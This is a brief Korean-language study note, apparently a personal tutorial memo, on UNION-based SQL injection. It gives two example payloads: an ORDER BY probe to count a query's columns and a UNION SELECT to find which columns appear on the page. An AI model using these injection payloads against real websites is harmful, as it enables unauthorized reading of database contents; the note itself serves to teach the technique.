# shincheonji

#UNION SQL INJECTION
order by: 어떤것으로 정렬 하겠다
```
aa' order by 1 #1에서부터 1씩 늘려가며 컬럼 개수를 알아낸다.
aa' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 #정확히 어떤 컬럼들이 화면에 출력돼는지 확인한다. 만약 컬럼개수가 3개라면 "   aa' union select 1,2,3 #   " 이렇게 한다.
```
